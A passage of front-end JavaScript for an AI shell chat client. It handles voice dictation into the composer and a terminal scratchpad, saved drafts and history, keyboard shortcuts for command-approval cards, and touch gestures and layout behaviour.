    for (const b of document.querySelectorAll(".mic-lang")) b.classList.toggle("active", b === btn);
    micLogLine(`language → ${micLang}`);
    if (micListening) { stopMic(); startMic(); } // restart so the new lang takes
  };
}

// ---- dictation (mic-to-composer, #97) ------------------------------------
// A mic button that dictates into the composer instead of typing. It keeps
// listening THROUGH pauses (iOS ends recognition on silence — we restart it)
// and finishes only when you say "stop" or tap the mic, so there's time to
// think mid-sentence. Interim words stream into the input live. When a dictated
// message is sent, its reply is auto-read via TTS (voice in → voice out), the
// reply language auto-detected by the existing TTS heuristic. Language can't be
// auto-detected for input, so a small EN/PL chip picks it.
let dictating = false;
let dictateRec = null;
let dictateLang = localStorage.getItem("aish-dict-lang") || "en-US";
let dictateBase = "";     // composer text present before dictation began (append)
let dictateFinal = "";    // committed transcript from COMPLETED recognition sessions
let dictateSession = "";  // the CURRENT session's transcript — rebuilt from results
                          // each event (never appended), so iOS re-firing the
                          // cumulative transcript can't duplicate it (#97). Merged
                          // into dictateFinal when the session ends.
let dictateEnded = false; // set on stop-word / tap so onend won't restart
let pendingSpeak = false; // current composer text came from dictation
let speakNextReply = false; // armed when a dictated message is sent
// Where the transcript lands: the chat composer, or the console's dictation
// scratchpad. The engine is shared — only the target element and the
// send-side behaviour differ.
let dictateTarget = "composer"; // "composer" | "pad"
let dictHold = false;     // pad: you're typing — don't let a result overwrite you

function dictEl() {
  return dictateTarget === "pad" ? $("pad-input") : input;
}

function setDictLang() {
  const label = dictateLang === "pl-PL" ? "PL" : "EN";
  $("dict-lang").textContent = label;
  $("pad-lang").textContent = label;
}

// Both mic buttons (composer + scratchpad) show the same recording state.
function setDictRecording(on) {
  $("dictate").classList.toggle("recording", on);
  $("pad-mic").classList.toggle("recording", on);
}

function toggleDictLang() {
  dictateLang = dictateLang === "pl-PL" ? "en-US" : "pl-PL";
  localStorage.setItem("aish-dict-lang", dictateLang);
  setDictLang();
  showToast(dictateLang === "pl-PL" ? "Dictation: Polski" : "Dictation: English");
  if (dictating) restartDictation();
}

// iOS mutes speechSynthesis unless it was first spoken inside a user gesture,
// and the reply is spoken seconds later (not in a gesture) — so we "unlock" it
// with a silent utterance on the mic tap. After that, later speak() calls play.
function primeTts() {
  if (!TTS_OK) return;
  try {
    const u = new SpeechSynthesisUtterance(" ");
    u.volume = 0;
    speechSynthesis.speak(u);
  } catch { /* best-effort unlock */ }
}

function dictJoin(a, b) {
  return a && b && !/\s$/.test(a) ? `${a} ${b}` : a + b;
}

function renderDictation(interim) {
  if (dictHold) return; // mid-edit in the scratchpad: your keystrokes win
  const el = dictEl();
  el.value = dictJoin(dictateBase, dictJoin(dictJoin(dictateFinal, dictateSession), interim));
  if (dictateTarget === "pad") { resizePadInput(); savePadDraft(); } // no input event fires
  else resizeInput(); // note: never touch the "Ask aish" placeholder
  // Once the textarea hits its max height it scrolls internally — keep the
  // newest dictated words in view instead of stranding you at the top (#97).
  el.scrollTop = el.scrollHeight;
}

// A trailing standalone "stop" ends dictation (deliberately NOT a silence timer,
// so pauses don't cut you off). Returns the text with that word removed.
function stripStopWord(text) {
  const m = text.match(/(^|\s)stop[\s.!?,]*$/i);
  return m ? text.slice(0, m.index).trimEnd() : text;
}

function beginRec() {
  dictateRec = new SpeechRec();
  dictateRec.lang = dictateLang;
  dictateRec.continuous = true;
  dictateRec.interimResults = true;
  dictateRec.onresult = (e) => {
    // Rebuild THIS session's transcript from all its results every event — never
    // append per-event. Desktop Chrome accumulates finals across the session, and
    // iOS re-fires the growing cumulative transcript (often flagged final and
    // with resultIndex stuck at 0); rebuilding is correct for both and stops the
    // iOS duplication (#97).
    let final = "", interim = "";
    for (let i = 0; i < e.results.length; i++) {
      const chunk = e.results[i][0].transcript;
      if (e.results[i].isFinal) final += chunk + " "; else interim += chunk;
    }
    dictateSession = final.trim(); // REPLACE, not append
    const combined = dictJoin(dictateFinal, dictateSession);
    const stripped = stripStopWord(combined);
    if (stripped !== combined) { // trailing "stop" ends dictation
      dictateFinal = stripped; dictateSession = ""; stopDictation(); return;
    }
    renderDictation(interim);
  };
  dictateRec.onerror = (e) => {
    if (e.error === "no-speech" || e.error === "aborted") return; // benign; onend restarts
    showToast(e.error === "not-allowed" ? "microphone permission denied" : `mic: ${e.error}`);
    stopDictation();
  };
  dictateRec.onend = () => {
    // Commit this session's transcript before any restart — iOS ends on silence
    // and a restarted session's results start empty, so without this the text so
    // far would be lost (and, before the rebuild fix, re-accumulated).
    if (dictateSession) { dictateFinal = dictJoin(dictateFinal, dictateSession); dictateSession = ""; }
    // iOS ends on silence — keep listening through pauses unless we ended on purpose.
    if (dictating && !dictateEnded) { try { dictateRec.start(); } catch { beginRec(); } }
  };
  try { dictateRec.start(); }
  catch { showToast("couldn't start the mic"); stopDictation(); }
}

function startDictation(target = "composer") {
  if (!SpeechRec || dictating) return;
  primeTts(); // unlock iOS audio now (this runs inside the mic-tap gesture)
  dictateTarget = target;
  dictHold = false;
  dictateBase = dictEl().value.trim();
  dictateFinal = "";
  dictateSession = "";
  dictateEnded = false;
  dictating = true;
  setDictRecording(true);
  beginRec();
}

function restartDictation() { // e.g. after a language switch mid-dictation
  if (dictateSession) { dictateFinal = dictJoin(dictateFinal, dictateSession); dictateSession = ""; }
  if (dictateRec) { dictateRec.onend = null; try { dictateRec.stop(); } catch { /* gone */ } }
  beginRec();
}

function stopDictation() {
  dictateEnded = true;
  dictating = false;
  if (dictateRec) {
    dictateRec.onend = null; // don't let the pending onend restart us
    try { dictateRec.stop(); } catch { /* already stopped */ }
    dictateRec = null;
  }
  setDictRecording(false);
  renderDictation(""); // commit the final text, drop any trailing interim
  const el = dictEl();
  // TTS is a chat notion: a scratchpad line goes to a terminal, not to a model.
  if (dictateTarget === "composer" && el.value.trim()) pendingSpeak = true;
  el.focus();
}

// Voice-in → voice-out: after a dictated message's reply lands, read it aloud.
function maybeSpeakReply() {
  if (!speakNextReply) return;
  speakNextReply = false;
  if (!TTS_OK) return;
  const answers = document.querySelectorAll(".msg.answer");
  const el = answers[answers.length - 1];
  const box = el && el.querySelector(".tts");
  if (box) startPlayback(box, el);
}

if (SpeechRec) {
  $("dictate").hidden = false;
  setDictLang();
  // Tap = start/stop dictation; hold (500ms) = switch input language. A hold
  // suppresses the tap so it doesn't also toggle dictation.
  const mic = $("dictate");
  let holdTimer = null;
  let wasHold = false;
  mic.addEventListener("pointerdown", () => {
    wasHold = false;
    holdTimer = setTimeout(() => { wasHold = true; toggleDictLang(); }, 500);
  });
  const cancelHold = () => clearTimeout(holdTimer);
  mic.addEventListener("pointerup", () => {
    clearTimeout(holdTimer);
    if (!wasHold) (dictating ? stopDictation() : startDictation());
  });
  mic.addEventListener("pointercancel", cancelHold);
  mic.addEventListener("pointerleave", cancelHold);
}

// ---- console dictation scratchpad ----------------------------------------
// Dictating straight into the terminal is unusable: iOS keyboard dictation
// REWRITES the whole field on every recognition update (it re-punctuates and
// corrects earlier words), and xterm forwards each rewrite to the PTY, which
// cannot retract bytes it already wrote — so the line comes out as every
// interim revision concatenated. This pad stages the text instead: nothing
// reaches the PTY until you tap Send, which also means a spoken command can be
// read and corrected before it runs. The transcription engine is the composer's
// (#97), retargeted via dictateTarget.
function resizePadInput() {
  const el = $("pad-input");
  const overlay = $("pty-overlay");
  // Grow with the text, but never past ~40% of the overlay (the visual viewport
  // height while the keyboard is up) — beyond that it scrolls internally.
  const cap = Math.max(80, Math.round((overlay.clientHeight || window.innerHeight) * 0.4));
  el.style.height = "auto";
  el.style.height = `${Math.min(el.scrollHeight, cap)}px`;
  positionPad();
}

// The pad floats above the key row rather than taking flex space, so opening it
// never re-fits xterm (which would resize the remote tmux pane). That means its
// offset from the bottom is the key row's height — 0 on desktop, where the row
// is display:none and offsetParent is null.
function positionPad() {
  const keys = document.querySelector(".pty-keys");
  const h = keys && keys.offsetParent !== null ? keys.offsetHeight : 0;
  $("pty-pad").style.bottom = `${h}px`;
}

function padOpen() {
  return !$("pty-pad").hidden;
}

// [PAD-DRAFT-START]
// Unsent pad text must survive the reloads the app performs on itself (a rev
// mismatch after an update) and PWA relaunches — losing a long spoken sentence
// to a restart is the same annoyance the history ring exists for. Mirrors the
// composer's `aish-draft`: saved on every change (dictation writes the value
// directly, which fires no input event, so renderDictation saves too), plus on
// pagehide, and cleared once the text is actually sent.
const PAD_DRAFT_KEY = "aish-pad-draft";
let padRestorePending = true; // consumed by the first openConsole of this page load

function savePadDraft() {
  const text = $("pad-input").value;
  try {
    if (text) localStorage.setItem(PAD_DRAFT_KEY, text);
    else localStorage.removeItem(PAD_DRAFT_KEY);
  } catch { /* storage full / private mode */ }
}

function padDraft() {
  try { return localStorage.getItem(PAD_DRAFT_KEY) || ""; } catch { return ""; }
}

function clearPadDraft() {
  try { localStorage.removeItem(PAD_DRAFT_KEY); } catch { /* nothing to clear */ }
}
// [PAD-DRAFT-END]

addEventListener("pagehide", savePadDraft);

function openConsolePad(dictate = true) {
  if (!consoleOpen) return;
  const pad = $("pty-pad");
  const el = $("pad-input");
  if (!pad.hidden) { el.focus(); return; }
  const draft = padDraft();
  if (draft && !el.value) el.value = draft; // survived a reload / relaunch
  pad.hidden = false;
  $("pad-history-list").hidden = true;
  setDictLang();
  resizePadInput();
  // Focus inside the opening gesture so iOS raises the keyboard immediately.
  el.focus();
  // Restoring a draft does NOT auto-start the mic: you may want to send or edit
  // what came back, and after a reload there is no gesture to unlock audio.
  if (dictate && SpeechRec) startDictation("pad"); // the pad exists to be spoken into
  else if (draft) showToast("restored your unsent dictation");
}

// Closing KEEPS the text (the draft is what you reopen into) — only sending it,
// or emptying the box yourself, discards it. Losing a spoken sentence to a
// mis-tapped ✕ would be the same failure this pad exists to prevent.
function closeConsolePad(discard = false) {
  if (dictating && dictateTarget === "pad") stopDictation();
  dictateTarget = "composer";
  dictHold = false;
  clearTimeout(padEditTimer);
  if (discard) clearPadDraft();
  else savePadDraft(); // before the box is emptied below
  $("pad-input").value = "";
  $("pad-history-list").hidden = true;
  $("pty-pad").hidden = true;
  if (consoleTerm) consoleTerm.focus();
}

// [PAD-HISTORY-START]
// The last 10 sends, kept so a line that landed in the wrong place (vim in
// normal mode, a program that wasn't reading stdin) can be re-sent instead of
// re-dictated — losing a long spoken sentence to a bad submit is the exact
// annoyance this pad is meant to remove.
const PAD_HISTORY_KEY = "aish-pad-history";
const PAD_HISTORY_MAX = 10;

function padHistory() {
  try {
    const raw = JSON.parse(localStorage.getItem(PAD_HISTORY_KEY));
    return Array.isArray(raw) ? raw.filter((t) => typeof t === "string" && t) : [];
  } catch {
    return []; // corrupt/absent — history is a convenience, never an error
  }
}

function padHistoryPush(text) {
  const kept = padHistory().filter((t) => t !== text); // re-sending moves it to the top
  kept.unshift(text);
  try {
    localStorage.setItem(PAD_HISTORY_KEY, JSON.stringify(kept.slice(0, PAD_HISTORY_MAX)));
  } catch { /* storage full / private mode */ }
}
// [PAD-HISTORY-END]

// [PAD-HISTORY-RENDER-START]
function togglePadHistory() {
  const box = $("pad-history-list");
  if (!box.hidden) { box.hidden = true; return; }
  box.replaceChildren();
  const items = padHistory();
  if (!items.length) {
    const empty = document.createElement("div");
    empty.className = "pad-history-empty";
    empty.textContent = "no previous dictations yet";
    box.appendChild(empty);
  }
  // Oldest first, so the NEWEST sits at the bottom — nearest the textarea and
  // your thumb. Storage stays newest-first; only the rendering is reversed.
  for (const text of items.slice().reverse()) {
    const entry = document.createElement("button");
    entry.type = "button";
    entry.textContent = text.replace(/\s+/g, " ");
    entry.title = text;
    entry.onclick = () => {
      $("pad-input").value = text; // load, never auto-send — you may want to edit
      box.hidden = true;
      resizePadInput();
      savePadDraft();
      $("pad-input").focus();
    };
    box.appendChild(entry);
  }
  box.hidden = false;
  box.scrollTop = box.scrollHeight; // a long list opens showing the newest
}
// [PAD-HISTORY-RENDER-END]

// [PAD-SEND-START]
function padSend(withEnter = true) {
  const text = $("pad-input").value.replace(/\s+$/, "");
  if (!text) { showToast("nothing to send"); return; }
  padHistoryPush(text);
  consoleSend(withEnter ? `${text}\r` : text);
  closeConsolePad(true); // sent — discard the draft
}
// [PAD-SEND-END]

// Typing a correction while the mic is live: freeze rendering so the next
// recognition event can't overwrite the edit, then re-baseline on the edited
// text and restart recognition, so new speech appends to what you wrote.
// Debounced — a restart per keystroke would shred the recognition session.
let padEditTimer = 0;
const PAD_EDIT_SETTLE = 700;

function padManualEdit() {
  resizePadInput();
  savePadDraft();
  if (!dictating || dictateTarget !== "pad") return;
  dictHold = true;
  clearTimeout(padEditTimer);
  padEditTimer = setTimeout(() => {
    dictateBase = $("pad-input").value;
    dictateFinal = "";
    dictateSession = "";
    dictHold = false;
    restartDictation();
  }, PAD_EDIT_SETTLE);
}

$("pad-close").onclick = () => closeConsolePad();
$("pad-history").onclick = () => togglePadHistory();
$("pad-lang").onclick = () => toggleDictLang();
$("pad-mic").onclick = () => {
  if (dictating) {
    stopDictation();
    if (dictateTarget === "pad") return; // it was ours — the tap just stopped it
  }
  startDictation("pad");
};
$("pad-input").addEventListener("input", padManualEdit);
$("pad-input").addEventListener("keydown", (e) => {
  // Enter is a NEWLINE — the pad composes multi-line text, and a stray Return
  // must never fire a command at the terminal. Only the Send button submits.
  // Esc closes without sending.
  if (e.key === "Escape") { e.preventDefault(); closeConsolePad(); }
});
// Tap = send + Enter; hold = insert the text WITHOUT Enter, for filling in a
// prompt you still want to review in the program itself.
(() => {
  const btn = $("pad-send");
  let holdTimer = null;
  let wasHold = false;
  btn.addEventListener("pointerdown", () => {
    wasHold = false;
    holdTimer = setTimeout(() => { wasHold = true; padSend(false); showToast("inserted without Enter"); }, 550);
  });
  const cancelHold = () => clearTimeout(holdTimer);
  btn.addEventListener("pointerup", () => {
    clearTimeout(holdTimer);
    if (!wasHold) padSend(true);
  });
  btn.addEventListener("pointercancel", cancelHold);
  btn.addEventListener("pointerleave", cancelHold);
})();

function closeSheets() {
  bvEndIfOpen();   // never leave a browser running behind a dismissed sheet
  // Blur a focused sheet input before hiding it: merely hiding leaves iOS to
  // dismiss the keyboard on its own schedule, and the layout-viewport pan it
  // caused can then settle without any visualViewport event (#8).
  const active = document.activeElement;
  if (active && active.closest(".sheet, #session-rail")) active.blur();
  if (micListening) stopMic(); // don't leave the mic live after closing /mic
  stopComposerMenuTracking(); // drop the #103 viewport listeners with the menu
  closeConsoleLinkMenu(); // its scrim is its own element, so the loop below misses it
  for (const sheet of document.querySelectorAll(".sheet")) sheet.hidden = true;
  for (const menu of document.querySelectorAll(".popover-menu")) menu.hidden = true;
  closeSessionRail(); // the sessions rail is not a sheet, but Escape/backdrop close both
  $("backdrop").hidden = true;
  snapViewportSoon();
}
for (const b of document.querySelectorAll("[data-close]")) {
  b.onclick = closeSheets;
}
$("backdrop").onclick = closeSheets;

$("sessions-new").onclick = () => { act({ type: "new" }, { label: "the new chat" }); closeSessionRail(); };
// New chat is in TWO places on purpose: the rail's copy is in thumb reach but
// unreachable until you know the rail exists, and the header's is the one you
// find without being told. Same action, two discovery paths.
$("new-chip").onclick = () => requestNewChat();

// [ACTIVE-APPROVAL-CARD-START]
// Single-key shortcuts for approval-card actions, one row per distinct button.
// Keys MUST be unique (a card never binds one key to two actions) — enforced by
// tests/js/test_approval_shortcut.js, which also checks every primary verdict
// button (.approve/.deny/.trust) and the Edit toggle is covered here. Scope
// segments (.seg) and copy (.copy-chip) are deliberately left to Tab: they
// refine or duplicate the Approve verdict rather than being verdicts of their
// own, and their natural mnemonics collide (Always vs Approve).
const CARD_SHORTCUTS = [
  { key: "a", selector: "button.approve", badge: true }, // Approve / Install / Just once
  { key: "d", selector: "button.deny", badge: true },    // Deny
  { key: "t", selector: "button.trust", badge: true },   // Trust dir (read card)
  { key: "e", selector: "button.cmd-icon" },             // Edit (icon button — tooltip only)
];

// The last approval card still awaiting a verdict (its Approve button is only
// disabled once answerCard resolves it). Newest-first so stacked cards clear
// bottom-up, matching where the eye is.
function activeApprovalCard() {
  const list = [...messagesEl.querySelectorAll(".card")];
  for (let i = list.length - 1; i >= 0; i--) {
    const approve = list[i].querySelector("button.approve");
    if (approve && !approve.disabled) return list[i];
  }
  return null;
}
// [ACTIVE-APPROVAL-CARD-END]

document.addEventListener("keydown", (e) => {
  // A confirmation modal is asking a question and owns Escape while it is up —
  // ahead of everything, since it can be raised over any of them, and Escape
  // must always answer "no" rather than dismiss something behind it (#202).
  // The preview sits over every other layer (it is opened FROM them), so it
  // takes Escape first — ahead even of the confirm modal, which cannot be
  // raised over it.
  if (e.key === "Escape" && closePreview()) { e.preventDefault(); return; }
  if (e.key === "Escape" && confirmIsOpen()) { e.preventDefault(); closeConfirm(); return; }
  // The console link menu is raised OVER the console, so Escape dismisses it
  // before Escape gets to mean anything to the terminal underneath.
  if (e.key === "Escape" && consoleLinkMenuOpen()) { e.preventDefault(); closeConsoleLinkMenu(); return; }
  // Esc leaves terminal mode / the PTY overlay first (#143); only if neither is
  // active does it fall through to dismissing an open sheet.
  if (e.key === "Escape" && escapeExit()) { e.preventDefault(); return; }
  if (e.key === "Escape" && (!$("backdrop").hidden || railIsOpen())) closeSheets();

  // Approval-card single-key actions (TUI convention): A = approve, D = deny,
  // T = trust dir, E = edit. Only while a card is pending and the user isn't
  // typing into the comment field or editing a command — clicking routes through
  // the button's own onclick so edit/scope/feedback handling stays in one place.
  // A key only acts when THIS card actually has that button, so T/E fall through
  // harmlessly on cards that lack them.
  if (!e.metaKey && !e.ctrlKey && !e.altKey && !editingNow()) {
    const sc = CARD_SHORTCUTS.find((s) => s.key === e.key.toLowerCase());
    if (sc) {
      const btn = activeApprovalCard()?.querySelector(sc.selector);
      if (btn && !btn.disabled) {
        e.preventDefault();
        btn.click();
        return;
      }
    }
  }

  // Primary navigation shortcuts. Ctrl/Cmd+N = new chat, Ctrl/Cmd+O = search
  // (open) sessions, Ctrl/Cmd+P = export (print) the session to PDF. The older
  // Cmd/Ctrl+Shift+O (new) / Shift+P (search) command-palette combos still work.
  if ((e.metaKey || e.ctrlKey) && !e.altKey) {
    const key = e.key.toLowerCase();
    if (key === "n" || (e.shiftKey && key === "o")) {
      e.preventDefault();
      act({ type: "new" }, { label: "the new chat" });
      closeSheets();
      return;
    }
    if (key === "o" || (e.shiftKey && key === "p")) {
      e.preventDefault();
      toggleSessionRail();
      return;
    }
    if (!e.shiftKey && key === "p") {
      e.preventDefault();
      exportSessionPdf();
      return;
    }
  }
  // Cmd/Ctrl+\ toggles the global "Quake console" (#148 follow-up). When the
  // overlay itself has focus, xterm's own key handler catches this first; this
  // is the OPEN path from anywhere else in the app.
  if ((e.metaKey || e.ctrlKey) && e.key === "\\") {
    e.preventDefault();
    toggleConsole();
  }
});

// Desktop only: auto-focusing on a phone would pop the keyboard over the
// content on every reconnect.
const FINE_POINTER = matchMedia("(pointer: fine)").matches;

// The send chord is otherwise invisible — the button is the only send path a
// reader can see, so it says so, on the pointer that has a modifier key. The
// tooltip is the only place the platform's own glyph appears; the handler
// accepts either modifier regardless of what is printed here.
if (FINE_POINTER) {
  const mac = /Mac|iP(hone|ad|od)/.test(navigator.platform || navigator.userAgent || "");
  $("send").title = mac ? "send (⌘↩)" : "send (Ctrl+Enter)";
}

// Grabber: drag down to dismiss (pointer events cover touch and mouse).
for (const sheet of document.querySelectorAll(".sheet")) {
  const handle = sheet.querySelector(".grabber");
  if (!handle) continue;
  let startY = null;
  handle.addEventListener("pointerdown", (e) => {
    startY = e.clientY;
    sheet.classList.add("dragging");
    handle.setPointerCapture(e.pointerId);
  });
  handle.addEventListener("pointermove", (e) => {
    if (startY === null) return;
    const dy = Math.max(0, e.clientY - startY);
    sheet.style.transform = `translateY(${dy}px)`;
  });
  const finish = (e) => {
    if (startY === null) return;
    const dy = e.clientY - startY;
    startY = null;
    sheet.classList.remove("dragging");
    sheet.style.transform = "";
    if (dy > 80) closeSheets();
  };
  handle.addEventListener("pointerup", finish);
  handle.addEventListener("pointercancel", finish);
}

function debounce(fn, ms) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), ms);
  };
}

// Arrow/Enter navigation for sheet result lists (same semantics as the
// TUI picker: first row is the best match, Enter takes the highlight).
// No row is pre-highlighted — a default cursor on row 0 reads as "you are
// here" (#29); Enter still takes the top match, arrows start from it.
function setActiveRow(rows, index) {
  rows.forEach((row, i) => row.classList.toggle("active", i === index));
  if (rows[index]) rows[index].scrollIntoView({ block: "nearest" });
}

function attachListNav(searchEl, listEl) {
  searchEl.addEventListener("keydown", (e) => {
    const rows = [...listEl.querySelectorAll(".row")];
    if (!rows.length) return;
    const index = rows.findIndex((row) => row.classList.contains("active"));
    if (e.key === "ArrowDown" || e.key === "ArrowUp") {
      e.preventDefault();
      const step = e.key === "ArrowDown" ? 1 : -1;
      const next = index < 0
        ? (step === 1 ? 0 : rows.length - 1)
        : (index + step + rows.length) % rows.length;
      setActiveRow(rows, next);
    } else if (e.key === "Enter") {
      e.preventDefault();
      (index >= 0 ? rows[index] : rows[0]).click();
    }
  });
}

// wrap mode: device-local ergonomics (like the token), not session state.
// Applied here, before any replay renders, so history draws in the chosen mode.
const WRAP_KEY = "aish-wrap";
if (localStorage.getItem(WRAP_KEY) === "1") document.body.classList.add("wrap");

// Reading-text size (#118): a multiplier on the --fs CSS variable, stepped from
// the ⋯ menu's A−/A+ and persisted. The transcript REFLOWS at the new size (the
// scaled surfaces keep their width), unlike pinch-zoom which magnifies a region.
const FONT_SCALE_KEY = "aish-font-scale";
const FS_MIN = 0.8, FS_MAX = 2.0, FS_STEP = 0.1;
let fontScale = parseFloat(localStorage.getItem(FONT_SCALE_KEY));
if (!(fontScale >= FS_MIN && fontScale <= FS_MAX)) fontScale = 1;
function applyFontScale() {
  document.documentElement.style.setProperty("--fs", String(fontScale));
  const el = $("fs-state");
  if (el) el.textContent = `${Math.round(fontScale * 100)}%`;
  localStorage.setItem(FONT_SCALE_KEY, String(fontScale));
}
function stepFontScale(delta) {
  fontScale = Math.min(FS_MAX, Math.max(FS_MIN, Math.round((fontScale + delta) * 100) / 100));
  applyFontScale();
}
applyFontScale();
// stopPropagation so stepping doesn't bubble to the menu's close-on-click.
$("fs-dec").onclick = (e) => { e.stopPropagation(); stepFontScale(-FS_STEP); };
$("fs-inc").onclick = (e) => { e.stopPropagation(); stepFontScale(FS_STEP); };
// Toggling wrap reflows every monospace block, so content heights above the
// viewport change and the reader would land on different text (#21). Anchor
// on the message at the top of the viewport and put it back at the same
// on-screen offset after the reflow; a reader pinned to the tail stays there.
function topVisibleAnchor() {
  const top = messagesEl.getBoundingClientRect().top;
  for (const el of messagesEl.children) {
    const rect = el.getBoundingClientRect();
    if (rect.bottom > top) return { el, offset: rect.top - top };
  }
  return null;
}

function restoreAnchor(anchor) {
  const top = messagesEl.getBoundingClientRect().top;
  messagesEl.scrollTop += anchor.el.getBoundingClientRect().top - top - anchor.offset;
  updateScrollButton();
}

function toggleWrap() {
  const wasAtBottom = nearBottom();
  const anchor = topVisibleAnchor();
  const on = document.body.classList.toggle("wrap");
  localStorage.setItem(WRAP_KEY, on ? "1" : "0");
  syncTermWrap(on); // global overrides every command block's local wrap + button
  syncDiffWrap(on); // ...and every diff card's local wrap + button
  // Reading layout right after the class toggle forces a synchronous
  // reflow, so the restored offset is computed against final geometry.
  if (wasAtBottom) scrollToEnd(true);
  else if (anchor) restoreAnchor(anchor);
  showToast(on ? "wrap on" : "wrap off");
}

// ---- the transcript's touch behaviour ------------------------------------
// The transcript owns NO horizontal gesture any more. Chats used to be switched
// by paging the transcript sideways through a stable per-device "working set"
// (#169); both are gone. The deck bet on spatial memory in a surface that never
// showed a map — you were asked to remember an order you could not see, a wrong
// guess cost a full page transition, and nothing ever taught you the right one —
// and the deck itself was a second, per-device source of truth about which chats
// matter, which had to be reconciled against the server's real session list
// forever (seeding, idle eviction, phantom pruning, fork anchoring). Switching
// now goes through the session rail: recency-ordered, server-derived, and
// visible while you choose. See [RAILSWIPE] below and the rail's own section.
//
// What survives here was never about paging: handing focus back so a long-press
// can select transcript text, and freezing viewport settling while it does.
// `currentSession` lives with its owner, [SESSION-ENTER].
let currentLogPath = ""; // absolute JSONL log path for this session, from hello (#146)
// Where the server keeps the files it was handed, from hello (#231). A stored
// attachment says `![[cat.png]]` with no path — deliberately, since the name is
// unique there and an absolute path would be noise that also breaks whenever the
// state directory moves — so this is what makes the name loadable.
let uploadsDir = "";
// The server's own recency list, oldest→newest, delivered on every hello. It
// used to be the pager's pages; it survives as the cheapest answer to "which
// chats are worth warming" (see prefetchTargets) and as the title source for a
// rename landing on a chat that isn't on screen.
let recentSessions = [];

// Text selection must win over every other gesture: dragging selection handles
// (or the drag right after a long-press) produces the same touch stream.
function selectionActive() {
  const selection = document.getSelection();
  return Boolean(selection && !selection.isCollapsed);
}

// [TOUCH-FREEZE-START]
// iOS WebKit will not establish a text selection while an editable element
// holds focus — the console's select mode blurs its textarea for exactly this
// reason (#148) — so a long-press on an answer while composing could never
// select it. Touching the transcript therefore hands focus back (dismissing
// the keyboard, the platform chat-app convention), and the viewport settling
// that dismissal triggers is FROZEN until the finger lifts: syncKeyboardInset's
// reflow, snapViewportHome's window scroll, and scrollToEnd would each move the
// text under the still-held finger, which cancels iOS's long-press gesture —
// the very selection the blur just made possible. The settle is run at
// touchend/touchcancel, when the gesture can no longer be disturbed.
let transcriptTouchDown = false;

function beginTranscriptTouch(activeEl, target) {
  transcriptTouchDown = true;
  const editable = activeEl &&
    (activeEl.tagName === "TEXTAREA" || activeEl.tagName === "INPUT" || activeEl.isContentEditable);
  // Never blur the element being touched — an approval card's own feedback
  // field lives INSIDE the transcript, and tapping into it must keep focus.
  if (editable && !activeEl.contains(target)) activeEl.blur();
}

function endTranscriptTouch(settle) {
  if (!transcriptTouchDown) return;
  transcriptTouchDown = false;
  settle(); // whatever viewport settling the touch suppressed, run it now
}

function viewportSettleAllowed() {
  return !transcriptTouchDown;
}

// The one movement the freeze cannot suppress by inaction: the keyboard
// dismissal makes iOS animate visualViewport.offsetTop back to 0, and a fixed
// body still pinned at the OLD offset slides DOWN the screen by exactly that
// much — losing the very text the finger is holding. Riding the pan (top
// follows offsetTop, nothing else) keeps the app's box glued to the visual
// viewport, so the content under the finger stays put; the kb-open toggle,
// the height, and every scroll stay frozen until the finger lifts.
function trackViewportPan() {
  if (!window.visualViewport) return;
  if (!document.body.classList.contains("kb-open")) return;
  document.body.style.top = `${Math.max(visualViewport.offsetTop, 0)}px`;
}
// [TOUCH-FREEZE-END]

// Some transcript children scroll sideways on their own (unwrapped command
// output, code blocks, tables). A pan that STARTS inside one is theirs — this
// is the same test the old pager used, and it is why swiping the whole
// transcript is safe: the only gesture it ever stole was inside these, and
// there it stands down. They also opt into `touch-action: pan-x pan-y`, so the
// browser scrolls them natively while we do nothing.
function scrollsHorizontally(node) {
  for (; node && node !== messagesEl; node = node.parentElement) {
    if (node.scrollWidth > node.clientWidth + 1) {
      const overflow = getComputedStyle(node).overflowX;
      if (overflow === "auto" || overflow === "scroll") return true;
    }
  }
  return false;
}

const railSwipe = {
  tracking: false, claimed: false, decided: false,
  startX: 0, startY: 0, startTime: 0, dx: 0, dy: 0, width: 1,
};

messagesEl.addEventListener("touchstart", (event) => {
  railSwipe.tracking = false;
  railSwipe.claimed = false;
  railSwipe.decided = false;
  if (event.touches.length !== 1) return;
  beginTranscriptTouch(document.activeElement, event.target);
  // The rail's opening gesture lives on the WHOLE transcript, not a 24px edge.
  // An edge-only drawer is the platform default, but this app is navigated by
  // it constantly and the edge is a fiddly target one-handed; the transcript is
  // the whole screen. What made the edge tempting — horizontally scrolling
  // children — is handled by standing down inside them, exactly as the old
  // pager did on this same surface for the same reason.
  if (railIsOpen() || !$("backdrop").hidden || consoleOpen) return;
  if (document.body.classList.contains("kb-open")) return;
  if (selectionActive() || scrollsHorizontally(event.target)) return;
  const touch = event.touches[0];
  railSwipe.tracking = true;
  railSwipe.startX = touch.clientX;
  railSwipe.startY = touch.clientY;
  railSwipe.startTime = event.timeStamp;
  railSwipe.dx = 0;
  railSwipe.dy = 0;
  railSwipe.width = messagesEl.clientWidth || innerWidth;
}, { passive: true });

messagesEl.addEventListener("touchmove", (event) => {
  if (!railSwipe.tracking || railSwipe.decided) return;
  const touch = event.touches[0];
  const dx = touch.clientX - railSwipe.startX;
  const dy = touch.clientY - railSwipe.startY;
  if (!railSwipe.claimed) {
    if (Math.abs(dx) < RAIL_AXIS_AT && Math.abs(dy) < RAIL_AXIS_AT) return;
    // Vertical-dominant, or a leftward drag (there is nothing to the left of
    // this view any more): stand down for the whole gesture rather than
    // half-tracking it.
    if (dx <= 0 || Math.abs(dx) < Math.abs(dy) * 1.4) { railSwipe.decided = true; return; }
    railSwipe.claimed = true;
    beginRailDrag();
  }
  railSwipe.dx = dx;
  railSwipe.dy = dy;
  // Passive, no preventDefault: `#messages` carries `touch-action: pan-y`, so
  // the browser already refuses to scroll a horizontally-started gesture. A
  // non-passive listener here would make every scrolled frame wait on the main
  // thread — the phone's biggest scroll-jank source.
  dragRailTo(Math.max(0, Math.min(dx, railSwipe.width)) / railSwipe.width);
}, { passive: true });

function endTranscriptGesture(event) {
  // scrollToEnd is deliberately NOT part of the deferred settle: yanking to the
  // bottom now would scroll a just-made selection out of view.
  endTranscriptTouch(() => { syncKeyboardInset(); snapViewportSoon(); });
  if (!railSwipe.tracking) return;
  railSwipe.tracking = false;
  if (!railSwipe.claimed) return;
  railSwipe.claimed = false;
  endRailDrag(railSwipeOpens({
    dx: railSwipe.dx,
    dy: railSwipe.dy,
    width: railSwipe.width,
    ms: (event ? event.timeStamp : railSwipe.startTime) - railSwipe.startTime,
    keyboardUp: false,
  }));
}
